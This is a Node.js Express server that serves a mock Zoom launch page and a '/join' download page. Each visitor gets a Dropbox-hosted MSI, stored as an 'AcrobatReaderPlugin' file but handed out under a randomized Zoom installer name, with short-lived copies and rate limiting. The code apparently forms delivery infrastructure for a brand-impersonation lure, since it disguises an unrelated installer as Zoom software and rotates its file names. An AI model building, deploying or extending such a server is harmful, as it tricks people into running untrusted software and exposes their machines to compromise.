import "dotenv/config";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import express from "express";
import { createRateLimiter } from "./lib/rateLimit.js";
import { createDropboxClient } from "./lib/dropbox.js";
import { createDownloadHandler } from "./api/download.js";
import logsHandler from "./api/logs.js";

const __dirname = path.dirname(fileURLToPath(import.meta.url));

// Defaults for the download. DOWNLOAD_FILE_PATH is the *source* file inside the
// app folder of the Dropbox account (case-sensitive; check with
// "npm run dropbox:list-files"). Each download is served from a server-side copy
// of that file whose name comes from DOWNLOAD_NAME_TEMPLATE, because Dropbox names
// the saved file after the stored file name. Copies older than
// DOWNLOAD_COPY_TTL_MINUTES are deleted by the next request.
const DEFAULT_DOWNLOAD_FILE_PATH = "/AcrobatReaderPlugin_V26.8.102.msi";
const DEFAULT_DOWNLOAD_NAME_TEMPLATE =
  "Zoom_cm_fo42mnktZ9vvrZo4_{random}_k6c8493c377d76800_.msi";
const DEFAULT_DOWNLOAD_COPY_TTL_MINUTES = 15;

/**
 * Read a non-negative numeric env var. `Number(x) || fallback` would silently
 * turn a legitimate 0 ("sweep every copy on the next request", "let the OS pick
 * the port") into the default, so the fallback is only used for a real NaN.
 */
function numberFromEnv(value, fallback) {
  const parsed = Number(value);
  return Number.isFinite(parsed) && parsed >= 0 ? parsed : fallback;
}

const config = {
  port: numberFromEnv(process.env.PORT, 3000),
  dropboxAppKey: process.env.DROPBOX_APP_KEY || "",
  dropboxAppSecret: process.env.DROPBOX_APP_SECRET || "",
  dropboxRefreshToken: process.env.DROPBOX_REFRESH_TOKEN || "",
  downloadFilePath: process.env.DOWNLOAD_FILE_PATH || DEFAULT_DOWNLOAD_FILE_PATH,
  downloadNameTemplate: process.env.DOWNLOAD_NAME_TEMPLATE || DEFAULT_DOWNLOAD_NAME_TEMPLATE,
  downloadCopyTtlMinutes: numberFromEnv(process.env.DOWNLOAD_COPY_TTL_MINUTES, DEFAULT_DOWNLOAD_COPY_TTL_MINUTES),
};

const missingDropbox = [
  ["DROPBOX_APP_KEY", config.dropboxAppKey],
  ["DROPBOX_APP_SECRET", config.dropboxAppSecret],
  ["DROPBOX_REFRESH_TOKEN", config.dropboxRefreshToken],
].filter(([, value]) => !value).map(([name]) => name);
if (missingDropbox.length) {
  console.error(
    `FATAL: ${missingDropbox.join(", ")} not set — the download is delivered from Dropbox.\n` +
      '  See the "Dropbox setup" section of the README.'
  );
  process.exit(1);
}
if (!config.downloadFilePath.startsWith("/")) {
  console.error(`FATAL: DOWNLOAD_FILE_PATH must be an absolute Dropbox path starting with "/", e.g. ${DEFAULT_DOWNLOAD_FILE_PATH}`);
  process.exit(1);
}

// Vite build output: index.html (launch mock), join.html (error/download page),
// /assets/* and everything copied from public/.
const distDir = path.join(__dirname, "dist");
const distIndex = path.join(distDir, "index.html");
const distJoin = path.join(distDir, "join.html");
if (!fs.existsSync(distIndex)) {
  console.warn('WARNING: dist/index.html not found — run "npm run build" first, or / will return 404.');
}

const dropbox = createDropboxClient({
  appKey: config.dropboxAppKey,
  appSecret: config.dropboxAppSecret,
  refreshToken: config.dropboxRefreshToken,
});

const app = express();
app.disable("x-powered-by");
// Must be on behind a reverse proxy (and on Vercel) so the rate limiter and the
// download log see the real client IP instead of the proxy's.
if (process.env.TRUST_PROXY === "1") app.set("trust proxy", 1);

/* ------------------------------- Pages -------------------------------- */
// "/" is the Zoom launch mock, "/join" the "download should start / please
// download manually" page. The explicit /join route is needed because neither
// express.static nor Vercel's static hosting resolve the extensionless /join
// on their own — on Vercel the "rewrites" entry in vercel.json maps
// /join -> /join.html; here in Express the route below does it directly.
app.get(["/join", "/join.html"], (req, res) => {
  res.sendFile(distJoin);
});
app.get("/", (req, res) => {
  res.sendFile(distIndex);
});
app.get("/app", (req, res) => {
  res.redirect(301, "/"); // former gated URL, kept for old links
});
app.use(express.static(distDir));

/* -------------------------------- API --------------------------------- */
// Each download request mints a fresh short-lived Dropbox link. The limiter
// keeps a single IP from draining the Dropbox API quota; it counts per server
// instance in memory, so it resets on restart/scale-up.
app.get(
  "/api/download",
  createRateLimiter({ windowMs: 15 * 60_000, max: 10 }),
  createDownloadHandler({
    dropbox,
    sourcePath: config.downloadFilePath,
    nameTemplate: config.downloadNameTemplate,
    copyTtlMinutes: config.downloadCopyTtlMinutes,
  })
);

// Pre-existing endpoint; enforces its own LOG_SECRET query parameter. It reads
// download-logs.json / tokens.json, which nothing writes anymore, so today it
// answers an empty list.
app.get("/api/logs", logsHandler);

/* ------------------------------ Fallbacks ------------------------------ */

app.use((req, res) => {
  res.status(404).send("Not found");
});

// eslint-disable-next-line no-unused-vars
app.use((err, req, res, next) => {
  console.error(err);
  res.status(500).send("Internal server error");
});

app.listen(config.port, () => {
  console.log(`Listening on http://localhost:${config.port}`);
  console.log(`  pages:        / (launch mock) and /join (download page)`);
  console.log(`  download:     Dropbox ${config.downloadFilePath}`);
  console.log(
    `  served as:    ${config.downloadNameTemplate} ` +
      `({random} fresh per download; copies kept ${config.downloadCopyTtlMinutes} min)`
  );
  // Fail fast on a wrong path or revoked token instead of at the first download.
  dropbox.verifyFile(config.downloadFilePath).then(
    (meta) => console.log(`  dropbox:      verified "${meta.name}" (${meta.size} bytes)`),
    (err) => console.error(`  dropbox:      WARNING check failed — ${err.message}`)
  );
});